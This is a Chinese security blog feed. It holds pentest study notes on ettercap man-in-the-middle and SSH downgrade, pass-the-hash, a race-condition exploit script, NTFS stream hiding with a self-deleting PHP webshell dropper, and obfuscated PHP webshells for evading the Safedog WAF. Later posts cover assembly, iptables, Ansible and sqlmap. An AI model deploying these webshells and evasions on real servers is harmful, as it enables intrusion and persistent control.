#列出log中的链接(ecp文件)etterlog -c -f /1.1.1.1/ log.ecpetterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa #选择相应的连接并榨取文件 filter(筛选器)默认存在的filter筛选文件目录1/usr/share/ettercap/ etter.filter.ssh筛选器作用：SSH1版本指SSH1.51版本，SSH2版本指SSH2.xx版本。当服务器同时支持SSH1版本与SSH2版本时，会显示SSH1.99版本 SSH1版本可以做中间人攻击，SSH2版本无法进行中间人攻击，etter.filter.ssh就是用来判断SSH的版本，若为SSH2版本则提示无法攻击；若为SSH1.99版本，则强制降级为SSH1.51版本；若为SSH1.51版本，则提示可以攻击 etter.filter.ssh筛选器使用：编译： 1etterfilter etter.filter.ssh -o ssh.ef 使用： 1ettercap -Tq -M arp:remote -i eth0 /192.168.1.1// /192.168.1.114// -F ssh.ef 可以编写自己的筛选器，用于替换网页中的下载，内容等，实现基于中间人攻击的更多的利用方法 ICMP中间人攻击1-M icmp:真实网关的MAC地址/真实网关的IP地址 DHCP中间人攻击123-M dhcp:IP地址池/IP段子网掩码/DNS服务器IP默认此种欺骗方式的网关为做欺骗的主机 switch port stealing(窃取交换机端口)中间人攻击1-M port /1.1.1.1/ /1.1.1.2/ NDP中间人攻击1-M ndp //IPv6地址/ //IPv6地址/ PASS THE HASH(PTH)密码破解耗费时间、资源巨大 可以使用密文提交给服务器直接完成身份认证 NTLM/LM是没有加盐的静态HASH密文 此种攻击方式只适用于Windows系统 1pth-winexe -U 用户名%密码密文 //目标IP cmd]]></content>
      <categories>
        <category>Kali Linux渗透测试</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB安全之条件竞争漏洞]]></title>
    <url>%2F2018%2F09%2F15%2FWEB%E5%AE%89%E5%85%A8%E4%B9%8B%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[条件竞争漏洞条件竞争漏洞是一种服务器端的漏洞 由于服务器在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类漏洞的发生 并发并发实质上是一个物理CPU在若干程序之间多路复用 并发性是对有限物理资源强制行使多用户共享以提高效率 微观：并发请求通过算法排队等候执行 宏观：多个几乎同时到达的请求在同时被处理 利用 脚本 123456789101112131415161718192021222324import requestsimport threadingimport Queueurl = &quot;目标url&quot;threads = 25q = Queue.Queue()for i in range(50): q.put(i) def post(): while not q.empty(): q.get() r = requests.post(url,data=&#123;&apos;money&apos;:1&#125;) print(r.text) if _name_==&apos;_main_&apos;: for i in range(threads): t = threading.Thread(target=post) t.start() for i in range(threads): t.join() 工具：Fiddler Fiddler是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据（指cookie,html,js,css等文件）。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露http通讯还提供了一个用户友好的格式。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB安全之NTFS文件流]]></title>
    <url>%2F2018%2F09%2F14%2FWEB%E5%AE%89%E5%85%A8%E4%B9%8BNTFS%E6%96%87%E4%BB%B6%E6%B5%81%2F</url>
    <content type="text"><![CDATA[NTFS文件流NTFS文件系统实现了多文件流特性，NTFS环境中一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流 Windows资源管理器默认不显示出文件的命名文件流 这些命名文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序 NTFS文件流生成步骤 任意NTFS分区下打开CMD窗口 1echo mstlab &gt;&gt; mst.txt:test.txt 则在当前目录下会生成一个名为mst.txt的文件，但文件的大小为0字节，无内容 使用以下命令可看到文件中的内容，即mstlab 1notepad mst.txt:test.txt 其中test.txt为命名文件流，mst.txt为默认的未命名文件流 mst.txt可以不存在，或者为已经存在的文件。文件格式没有要求 可以达到的目的：将任意文本信息隐藏于任意文件中，只要不泄露冒号后的虚拟文件名(即test.txt)，则其他人无法查看到隐藏信息 包含隐藏信息的文件仍然可以继续隐藏其他内容，即mst.txt可以再次创建新的隐藏信息的流文件test1.txt，体现了NTFS的多文件流特性 此时，mst.txt:test.txt与mst.txt:test1.txt相互独立，无影响 在此时， mst.txt为宿主，被test.txt和test1.txt所寄生。当宿主消失，寄生也随之消失 NTFS特性特性1利用文件流启动程序 初始使用工具：https://github.com/wangyongxina/filestreams/blob/master/Release/Release.7z 新建文本文档mst.txt 列举文件的文件流 1FileStreams.exe enum mst.txt 如图，文件的文件流为default(默认的文件流) 创建新的文件流vkey 1FileStreams.exe create mst.txt vkey 向vkey文件流写入内容 1FileStreams.exe write mst.txt vkey mstsec 查看vkey文件流内容 1FileStreams.exe dump mst.txt vkey 12 命令中的12为vkey文件流的大小 使用文件流启动程序 删除文件流vkey 1FileStreams.exe delete mst.txt vkey 创建新的文件流wkey 1FileStreams.exe create mst.txt wkey 加入文件到文件流wkey 1FileStreams.exe append mst.txt wkey C:\Users\W\Desktop\filestreams-master\Release\Release\FileStreams.exe 1FileStreams.exe enum mst.txt 1FileStreams.exe dump mst.txt wkey 10 执行文件流中的程序 1FileStreams.exe launch mst.txt wkey 特性2自动创建空文件 当创建寄生文件流时，若不存在指定的宿主文件，则会自动创建一个空的宿主文件，然后创建此文件的寄生文件流 NTFS实际应用 利用特性1可以实现软件后门 利用文件流绕过安全狗 webshell后门 12345678910&lt;?phpexec(&apos;echo &quot;&lt;?php @eval($_POST[key]);?&gt;&quot;&gt;&gt;index.php:key.php&apos;);$key = &lt;&lt;&lt;keyecho &quot;&lt;?php include &apos;index.php:key.php&apos;;?&gt;&quot;&gt;&gt;a.phpkey;exec($key);$url = $_SERVER[&apos;PHP_SELF&apos;];$filename = substr($url,strrpos($url,&apos;/&apos;)+1);@unlink($filename);?&gt; 参考链接https://zhuanlan.zhihu.com/p/26108362 https://zhuanlan.zhihu.com/p/26181401]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB安全之Webshell绕过安全狗]]></title>
    <url>%2F2018%2F09%2F14%2FWEB%E5%AE%89%E5%85%A8%E4%B9%8BWebshell%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%2F</url>
    <content type="text"><![CDATA[针对PHP与MYSQL架构 一句话木马 1&lt;?php @eval($_POST[&apos;key&apos;]);?&gt; 安全狗，云锁，D盾属于软件级防护 查杀规则静态文本查杀对扫描目录中的文本中的内容进行检测，做关键字匹配 动态执行查杀 在webshell执行，进行数据传输时进行查杀 将可疑文件放入沙箱模拟运行，根据运行状态和结果来判断文件是否安全 规则绕过静态文本查杀 大小写转换 strtolower() 文本颠倒 strrev() 文本分割 使用点分割：. 1234&lt;?php $a=&quot;ass&quot;.&quot;ert&quot;; $a($_POST[&apos;key&apos;]); ?&gt; 使用数组分割： 12345&lt;?php $a=array(&quot;ass&quot;,&quot;ert&quot;); $a=$a[0].$a[1]; $a($_POST[&apos;key&apos;]); ?&gt; 干扰函数 echo() print() print_r() var_dump() 1234567&lt;?php$a=array(&quot;Tre&quot;,&quot;sSA&quot;);$a=$a[0].$a[1];$b=strtolower($a);print_r($c=strrev($b));echo(var_dump($c($_POST[&apos;key&apos;])));?&gt; 加密 针对assert()或eval()做先加密，后解密 base64_decode() base64_encode() 语言特征 自定义类 class 123456789&lt;?phpclass KKey&#123; public function gkey($a)&#123; @eval($a); &#125;&#125;$key = new KKey;$key -&gt; gkey($_POST[&apos;key&apos;]);?&gt; 自定义函数 function 123456&lt;?phpfunction gkey($a)&#123; @eval($a);&#125;gkey($_POST[&apos;key&apos;]);?&gt; 函数替换 使用assert()代替eval() 动态执行查杀安全狗会检测Cknife传输方式进行查杀 加密传输 修改Cknife配置文件Config.ini 123PHP_MAKE=@eval(base64_decode($_POST[action]));将上方变量的值进行base64加密 修改一句话木马 123456&lt;?phpfunction gkey($a)&#123; @eval($a);&#125;gkey(base64_decode($_POST[&apos;key&apos;]));?&gt; 手工利用时 123key=eval(system(&quot;whoami&quot;));将上方变量的值进行base64加密 手工利用过程将key值编码后传入到一句话木马文件，一句话木马文件进行解码后执行。因进行了编码，安全狗在传输过程中无法检测查杀 Cknife利用过程Cknife配置文件中将传输方式进行了编码，即PHP_MAKE部分。此部分即为传送给一句话木马文件的key,一句话木马文件进行解码后执行。 Cknife配置文件中PHP_MAKE为一句话木马中的参数key PHP_INDEX为Cknife中的action,用于获取目标文件目录等操作 改变传输特征]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-寄存器]]></title>
    <url>%2F2018%2F09%2F13%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[一个典型的CPU由运算器，控制器，寄存器等组成 内部总线实现CPU内器件联系 外部总线实现CPU和主板上其他器件联系 CPU中： 运算器进行信息处理 寄存器进行信息存储 控制器控制各种器件进行工作 内部总线连接CPU内部器件，在它们之间进行数据传送 寄存器是CPU中程序员可用指令读写的部件 程序员可以通过改变各种寄存器中的内容来实现对CPU的控制 通用寄存器8086CPU为16位寄存器，每个寄存器存放两个字节数据 通用寄存器，用于存放一般性数据，为： AX BX CX DX 8086CPU的通用寄存器中每个寄存器都可以分为两个可独立使用的8位寄存器使用 低8位为L,高8位为H AX -&gt; AH + AL BX -&gt; BH + BL CX -&gt; CH + CL DX -&gt; DH + DL 字在寄存器中的存储 字节：byte，1byte=8bit 字：word，1word=2byte=16bit。这两个字节称为这个字的高位字节和低位字节 几条汇编指令汇编指令与寄存器名称不区分大小写 mov ax,18 —&gt; 将18送入寄存器AX add ax,8 —&gt; 将AX中的值加8后存入AX mov ax,bx —&gt; 将BX数据送入AX add ax,bx —&gt; 将AX与BX中数据相加后存入AX 当使用AL之类的8位寄存器时，AH和AL为两个不相关的寄存器，AL计算产生的进位不会存储到AH中 当使用AL之类寄存器时，进行的是8位运算 当使用AX之类寄存器时，进行的是16位运算 当汇编指令的两个操作对象的位数不一致时，无法进行运算操作，此时的汇编指令为错误的 物理地址CPU通过地址总线送入存储器的，必须是一个内存单元的物理地址 在CPU向地址总线上发出物理地址之前，必须要在内部先形成这个物理地址 16位结构的CPU16位结构(16位机，字长为16位)的CPU具有以下特性： 运算器一次最多可以处理16位的数据 寄存器的最大宽度为16位 寄存器与运算器之间的通路位16位 对于16位的CPU，能一次处理，传输，暂时存储16位的地址 8086CPU给出物理地址的方法8086CPU有20条地址总线，可达到1MB的寻址能力 但8086CPU为16位结构，其内部只能处理，传输，暂时存储16位的地址，所以其表现出的寻址能力只有64KB 8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址 如图 CPU提供两个16位地址，一个称为段地址SA，另一个位偏移地址EA 两个16位地址通过内部总线送入地址加法器 地址加法器将两个16位地址合成为一个20位的物理地址 地址加法器通过内部总线将20位的物理地址送入输入输出控制电路 输入输出控制电路将20位物理地址送入地址总线 20位物理地址被地址总线传送到存储器 地址加法器采用物理地址=段地址*16+偏移地址的方法合成物理地址 *16对于十六进制来说为多加一个0，左移1位；对于二进制来说为多加四个0，左移4位 “段地址*16+偏移地址=物理地址”的本质含义CPU在访问内存时，用一个基础地址(段地址*16)和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址 基础地址(段地址*16)+偏移地址=物理地址 段的概念内存并没有分段，段的划分来自于CPU CPU用分段的方法来管理内存 若编程需要，将若干地址连续的内存单元看作一个段，用段地址*16定位段的起始位置(基础地址)，用偏移地址定位段中的内存单元 注意： 段地址*16必然是16的倍数，所以一个段的起始地址也一定是16的倍数 偏移地址为16位，16位地址的寻址能力为64KB，所以一个段的长度最大为64KB 段寄存器段地址在8086CPU的段寄存器中存放 8086CPU有4个段寄存器：CS,DS,SS,ES CS和IP它们指示了CPU当前要读取指令的地址 CS为代码段寄存器，存放指令的段地址 IP为指令指针寄存器，存放指令的偏移地址 在8086CPU中，任意时刻，设CS中内容为M，IP中内容为N，8086CPU将从内存M*16+N单元开始，读取一条指令并执行 即，8086机中，任意时刻，CPU将CS:IP指向的内容当作指令执行 8086CPU工作过程如下： 从CS:IP指向的内存单元读取指令，读取的指令进入指令缓存器 IP=IP+所读取指令的长度，从而指向下一条指令 执行指令。转到步骤1，重复这个过程 CPU初始时，CS=FFFFH，IP=0000H。即，8086PC机开机后执行的第一条指令是FFFF0H内存单元中的指令 修改CS,IP的指令CPU从何处执行指令是由CS,IP中的内容决定的，程序员可以通过改变CS,IP中的内容来控制CPU执行目标指令 mov指令称为传送指令，但其不可以设置CS,IP的值 能够改变CS,IP的内容的指令被统称为转移指令 jmp指令为转移指令的一种 同时修改CS,IP的内容 格式：jmp 段地址:偏移地址 例：jmp 2AE3:3，执行后：CS=2AE3H,IP=0003H，CPU将从2AE33H处读取指令 修改IP的内容 格式：jmp 某一合法寄存器 功能：用寄存器中的值修改IP 例：jmp ax, 指令执行前：ax=1000H,CS=2000H,IP=0003H 指令执行后：ax=1000H,CS=2000H,IP=1000H 代码段对于8086PC机，可根据需要，将一组内存单元定义为一个段。 可以将长度为N(N&lt;=64KB)的一组代码，存放在一组地址连续，起始地址为16的倍数的内存单元中。此时，这段内存是用来存放代码的，从而定义了一个代码段 要让CPU执行代码段中的指令，必须将CS:IP指向所定义的代码段中的第一条指令的首地址 Debug安装使用win10 64位使用debug方法: https://blog.csdn.net/plus_re/article/details/60761467 Debug常用功能 R命令查看，改变CPU寄存器的内容 D命令查看内存中的内容 E命令改写内存中的内容 U命令将内存中的机器指令翻译成汇编指令 T命令执行一条机器指令 A命令以汇编指令的格式在内存中写入一条机器指令 Debug操作 R命令查看，改变CPU寄存器的内容 查看寄存器内容 如图：CS:IP所指向的内存单元为073F:0100，此处的指令即CPU当前要读取，执行的指令，此处存放的机器码为0000，对应的汇编指令为ADD [BX+SI],AL 修改寄存器内容 D命令查看内存中的内容 格式：d 段地址:偏移地址 如图，此时将列出从指定内存单元开始的128个内存单元中的内容 格式：d 段地址:起始偏移地址 结尾偏移地址 如图，指定D命令的查看范围 格式：d 会一直回显后面内存单元中的内容 E命令改写内存中的内容 格式：e 起始地址(段地址:偏移地址) 数据 数据 数据 ... 可以使用E命令向内存中写入数字，字符(‘ ‘)，字符串(“ “)，机器码 U命令将内存中的机器指令翻译成汇编指令 格式：u 起始地址(段地址:偏移地址) 将从开始内存单元中将内容翻译成汇编指令，并显示出来 T命令执行机器指令 格式：t 执行CS:IP指向的指令，指令执行后，显示输出CPU中的寄存器状态 A命令以汇编指令的格式在内存中写入一条机器指令 格式：a 段地址:偏移地址]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-基础知识]]></title>
    <url>%2F2018%2F09%2F13%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[机器语言机器语言是机器指令的集合 计算机的机器指令是一列二进制数字，计算机将其转变为一列高低电平，以使计算机的电子器件受到驱动，进行运算 每一种CPU都有自己的机器指令集，也就是机器语言 汇编语言的产生解决机器语言难于辨认和记忆 汇编指令通过编译器转换为机器指令，由计算机最终执行 汇编语言的组成汇编语言由3类指令组成 汇编指令：机器码的助记符，有对应的机器码 伪指令：没有对应的机器码，由编译器执行，计算机并不执行 其他符号：如+,-,*,/等，由编译器识别，没有对应的机器码 汇编语言的核心是汇编指令 存储器内存 指令和数据在内存或磁盘上，指令和数据没有任何区别，都是二进制信息 CPU执行时会区分指令与数据 存储单元存储器被划分为若干个存储单元，每个存储单元从0开始顺序编号，这些编号可以看作存储单元在存储器中的地址 微型机存储器的存储单元可以存储一个Byte(字节)，即8个二进制位 CPU对存储器的读写CPU要想进行数据的读写，必须和外部器件进行下面3类信息的交互： 存储单元的地址(地址信息) 器件的选择，读或写的命令(控制信息) 读或写的数据(数据信息) 在计算机中专门有连接CPU和其他芯片的导线，通常称为总线 根据传送信息的不同，总线从逻辑上分为3类：地址总线，控制总线，数据总线 地址总线CPU通过地址总线来指定存储器单元 地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址 一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N，此CPU最多可寻找2的N次方个内存单元 数据总线CPU与内存或其他器件之间的数据传送是通过数据总线来进行的 数据总线的宽度决定了CPU与外界的数据传送速度 N根数据总线一次可传送N位二进制数据 8088的数据总线宽度为8 8086的数据总线宽度为16 控制总线CPU对外部器件的控制是通过控制总线来进行的 有多少根控制总线，即意味着CPU提供了对外部器件的多少种控制 主板接口卡CPU通过控制接口卡从而实现对外部设备的间接控制 各类存储器芯片随机存储器(RAM)可读可写，掉电丢失 用于存放供CPU使用的绝大部分程序和数据 装在主板上的RAM 插在扩展卡槽上的RAM 接口卡上的RAM，例显存 只读存储器(ROM)可读不可写，掉电不丢失 装有BIOS(Basic Input/Output System,基本输入/输出系统)的ROM 内存地址空间CPU控制存储器时，将它们看作由若干存储单元组成的逻辑存储器，即内存地址空间 如图，所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间 CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据 内存地址空间的大小受CPU地址总线宽度的限制 当基于计算机硬件系统编程时，必须知道此系统中的内存地址空间分配情况。只有向对应地址写入数据，才会出现想要的结果]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables防火墙]]></title>
    <url>%2F2018%2F09%2F10%2Fiptables%E9%98%B2%E7%81%AB%E5%A2%99%2F</url>
    <content type="text"><![CDATA[linux包过滤防火墙netfilter位于Linux内核中 Linux防火墙的“内核态” iptables位于/sbin/iptables，用于管理防火墙规则的工具 Linux防火墙的“用户态” 包过滤：网络层，针对IP数据包 处理包内IP,端口等信息 iptables防火墙规则表1234raw：确定是否对该数据包进行状态跟踪mangle：为数据包设置标记nat：修改数据包中的源，目标IP或端口filter：确定是否放行该数据包 规则链12345INPUT:处理入站数据包OUTPUT:处理出站数据包FORWARD:处理转发数据包PREROUTING:进行路由选择前处理数据包POSTROUTING:进行路由选择后处理数据包 动作12345678ACCEPT：允许通过 DROP：丢弃数据包，无回应REJECT：拒绝通过，必要时会给出提示REDIRECT：重定向、映射、透明代理。SNAT：源地址转换。DNAT：目标地址转换。MASQUERADE：IP伪装（NAT），用于ADSL。LOG：日志记录。然后传给下一条规则继续匹配 规则表匹配顺序1raw--&gt;mangle--&gt;nat--&gt;filter 规则链匹配顺序123入站：PREROUTING--&gt;INPUT出站：OUTPUT--&gt;POSTROUTING转发：PREROUTING--&gt;FORWARD--&gt;POSTROUTING 链内匹配顺序依次检查，匹配则停止（LOG策略除外） 无匹配规则，则按该链默认策略处理 iptables基本语法12345678910iptables -t 表名 \&lt;-A/I/D/R&gt; 规则链名 \[规则号] \&lt;-i/o 网卡名&gt; \-p 协议名 \&lt;-s 源IP/源子网&gt; \--sport 源端口 \&lt;-d 目标IP/目标子网&gt; \--dport 目标端口 \-j 动作 iptables参数1234567891011121314151617181920212223242526272829303132-t：指定表，默认filter表-A：链尾追加规则-I：链头（或指定位置）插入规则-R：替换规则链中的条目-Z：清空规则链中的数据包计算器和字节计数器-X：删除用户自定的链. 要删除的链必须不存在其他参考.-L：列出指定表中所有规则-n：以数字形式显示地址，端口信息-v：显示详细信息--line-numbers：显示规则的序号-D：删除链内指定序号的的一条规则-F：清空指定表的所有规则-P：为指定表指定链设置默认规则-p：指定协议名-s：指定源地址-d：指定目的地址-i：指定入站网卡-o：指定出站网卡--sport：指定源端口--dport：指定目的端口--tcp-flags：指定tcp标志位类型--icmp-type：指定ICMP类型-m multiport --sports 或-m multiport --dports：多端口匹配-m iprange --src-range：IP范围匹配-m mac --mac-source：mac地址匹配-m state --state：状态匹配 注意使用nat规则必须配置内核文件，开启路由转发功能 12345/etc/sysctl.confnet.ipv4.ip_forward = 1sysctl -p #生效内核配置文件或echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward 导出iptables配置iptables-save用于将linux内核中的iptables表导出到标准输出设备。 通常，使用shell中I/O重定向功能将其输出保存到指定文件中。 使用此功能可能需要安装1yum install iptables-services 参数 12-c：指定要保存的iptables表时，保存当权的数据包计算器和字节计数器的值；-t：指定要保存的表的名称。 例12iptables-save -t filter &gt; iptables.bakcat iptables.bak 例本地端口转发12345678开启路由转发功能echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward 发往442端口的流量转到22端口iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22允许目的为442端口的入站iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自动化运维Ansible]]></title>
    <url>%2F2018%2F09%2F10%2F%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4Ansible%2F</url>
    <content type="text"><![CDATA[Ansible是什么Ansible 一种集成 IT 系统的配置管理、应用部署、执行特定任务的开源平台，是 AnsibleWorks 公司名下的项目，该公司由 Cobbler 及 Func 的作者于 2012 年创建成立。 Ansible 基于 Python 语言实现，由 Paramiko 和 PyYAML 两个关键模块构建。 只需要可以使用 ssh 访问你的服务器或设备就行。它也不同于其他工具，因为它使用推送的方式，而不是像 puppet 等那样使用拉取安装agent的方式。你可以将代码部署到任意数量的服务器上! Ansible能做什么Ansible可以帮助我们完成一些批量任务，或者完成一些需要经常重复的工作 比如：同时在100台服务器上安装nginx服务，并在安装后启动它们。 比如：将某个文件一次性拷贝到100台服务器上。 比如：每当有新服务器加入工作环境时，你都要为新服务器部署某个服务，也就是说你需要经常重复的完成相同的工作。 Ansible特性 模块化：调用特定的模块，完成特定任务 有Paramiko，PyYAML，Jinja2（模板语言）三个关键模块 支持自定义模块 基于Python语言实现 部署简单，基于python和SSH(默认已安装)，agentless 安全，基于OpenSSH 支持playbook编排任务 幂等性：一个任务执行一遍和执行n遍效果一样，不因重复执行带来意外情况 无需代理不依赖PKI（无需ssl） 可使用任何编程语言写模块 YAML格式，编排任务，支持丰富的数据结构 较强大的多层解决方案 Ansible架构 Ansible工作原理 Ansible主要组成部分功能说明 PLAYBOOKS 任务剧本（任务集），编排定义Ansible任务集的配置文件，由Ansible顺序依次执行，通常是JSON格式的YML文件 INVENTORY Ansible管理主机的清单/etc/anaible/hosts MODULES Ansible执行命令的功能模块，多数为内置的核心模块，也可自定义,ansible-doc –l 可查看模块 PLUGINS 模块功能的补充，如连接类型插件、循环插件、变量插件、过滤插件等，该功能不常用 API 供第三方程序调用的应用程序编程接口 ANSIBLE 组合INVENTORY、 API、 MODULES、PLUGINS的绿框，可以理解为是ansible命令工具，其为核心执行工具 注意事项 执行ansible的主机一般称为主控端，中控，master或堡垒机 主控端Python版本需要2.6或以上 被控端Python版本小于2.4需要安装python-simplejson 被控端如开启SELinux需要安装libselinux-python windows不能做为主控端 安装Ansible1yum -y install ansible 配置 Ansible1ls /etc/ansible 12345ansible.cfg hosts rolesansible.cfg 是 Ansible 工具的配置文件hosts 用来配置被管理的机器roles 是一个目录，playbook 将使用它 Ansible 管理机与被管理机做秘钥认证生成密钥1ssh-keygen 将管理机公钥写入被管理机1ssh-copy-id -i ~/.ssh/id_rsa.pub -p 22 root@192.168.3.171 hosts文件添加被管理机1vim /etc/ansible/hosts 添加如下行 12[Client]192.168.3.171 测试 Ansible管理机运行 1ansible Client -m ping 参考文档https://www.cnblogs.com/wangxiaoqiangs/p/5685239.html blog.51cto.com/191226139/2066936]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP使用]]></title>
    <url>%2F2018%2F08%2F25%2FSQLMAP%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Sqlmap是什么完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。 完全支持: 基于布尔的盲注：根据返回页面判断条件真假的注入 基于时间的盲注：增加注入时间延迟语句，根据页面返回时间判断注入语句是否执行 基于错误信息的注入：根据返回页面的报错信息判断注入 基于联合查询的注入：使用union联合查询注入 基于堆查询的注入：可以同时执行多条语句的注入 在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。 支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。 支持自动识别密码哈希格式并通过字典破解密码哈希。 支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。 支持在数据库管理系统中搜索指定的数据库名、表名或列名 当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。 当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。 Sqlmap全部参数杂项显示帮助信息并退出1-h,--help 显示详细的帮助信息并退出1-hh 显示版本信息并退出1--version 输出级别(默认输出级别为1)0：只显示Python的tracebacks信息、错误信息ERROR和关键信息CRITICAL 1：同时显示普通信息INFO和警告信息WARNING 2：同时显示调试信息DEBUG 3：同时显示注入使用的攻击荷载 4：同时显示HTTP请求 5：同时显示HTTP响应头 6：同时显示HTTP响应体 1-v VERBOSE(0-6) 目标直连数据库1-d DIRECT 12345当数据库管理系统是MySQL、Oracle、Microsoft SQL Server或PostgreSQL等时格式为：DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME当数据库管理系统是SQLite、Microsoft Access或Firebird等时格式为：DBMS://DATABASE_FILEPATH 指定一个URL作为目标1-u URL,--url=URL 从Burp或WebScarab代理日志文件中解析目标该参数后跟一个表示日志文件的路径 1-l LOGFILE 从远程站点地图（.xml）文件中解析目标1-x SITEMAPURL 扫描文本文件中给出的多个目标1-m BULKFILE 从文件加载HTTP请求1-r REQUESTFILE 将Google搜索结果作为攻击目标Sqlmap能自动获取Google搜索的前一百个结果，对其中有GET参数的URL进行注入测试 1-g GOOGLEDORK 从配置文件中加载选项Sqlmap会解析该配置文件，按照该配置文件的配置执行动作。配置文件中可以指定攻击目标，实际上除了攻击目标外，配置文件还可以指定各种参数的值 1-c CONFIGFILE 请求强制使用给定的HTTP方法（例如PUT）1--method=METHOD POST数据该参数指定的数据会被作为POST数据提交 1--data=DATA 指定参数分隔符默认地以&amp;作为分隔符 1--param-del=PARA.. HTTP Cookie头的值1--cookie=COOKIE 指定用于分割cookie值的字符1--cookie-del=COO.. 从文件中载入Netscape或wget格式的cookie1--load-cookies=L.. Sqlmap忽略响应头中的“Set-Cookie”1--drop-set-cookie 指定一个User-Agent值1--user-agent=AGENT 使用随机选择的HTTP User-Agent头值1--random-agent 指定HTTP头中的Host值1--host=HOST 指定HTTP头中的Referer值Sqlmap发送的HTTP请求头部默认无Referer字段 1--referer=REFERER 指定一个额外的头1-H HEADER 指定多个额外的头若添加多个字段，用\n分隔 1--headers=HEADERS 指定HTTP认证类型(Basic, Digest, NTLM , PKI)1--auth-type=AUTH.. 指定HTTP身份验证凭证格式是username:password 1--auth-cred=AUTH.. 基于证书的身份认证若Web服务器要求客户端提供证书则可以使用此参数指定一个PEM格式的证书文件 1--auth-file=AUTH.. 忽略HTTP错误代码123--ignore-code=IG..--ignore-code=401 忽略系统默认代理设置1--ignore-proxy 忽略重定向的尝试1--ignore-redirects 忽略连接超时1--ignore-timeouts 设置一个HTTP(S)代理连接到目标URL格式是http(s)://url:port 1--proxy=PROXY 指定代理身份验证凭证格式是username:password 1--proxy-cred=PRO.. 从文件中加载代理列表1--proxy-file=PRO.. 使用tor匿名网络1--tor 设置Tor代理端口而不是默认1--tor-port=TORPORT 设置Tor代理类型（HTTP、SOCKS4或SOCKS5）默认SOCKS5类型 1--tor-type=TORTYPE 检查Tor是否正确使用1--check-tor 每次HTTP请求之间添加延迟1--delay=DELAY 设置超时时间默认30秒 1--timeout=TIMEOUT 设置超时后最大重试次数默认3次 1--retries=RETRIES 随机化参数值随机生成每次HTTP请求中参数的值，值的类型和长度依照于原始值 1--randomize=RPARAM 避免错误请求过多而被屏蔽有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而Sqlmap的测试往往会产生大量错误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。 Sqlmap不会对安全URL进行任何注入测试 设置隔一会就访问一下的安全URL 1--safe-url=SAFEURL 设置访问安全URL时携带的POST数据 1--safe-post=SAFEURL 从文件中载入安全HTTP请求 1--safe-req=SAFEURL 每次测试请求之后都会访问一下的安全URL 1--safe-freq=SAFEURL 关闭URL编码Sqlmap默认会对URL进行URL编码1--skip-urlencode 用于指定包含token的隐藏字段名1--csrf-token=CSRFURL 从任意的URL中回收token值1--csrf-url=CSRFURL 强制使用SSL1--force-ssl 使用HTTP参数污染法HTTP参数污染是绕过WAF/IPS/IDS的一种技术 1--hpp 在每次请求前执行特定Python代码1--eval=EVALCODE 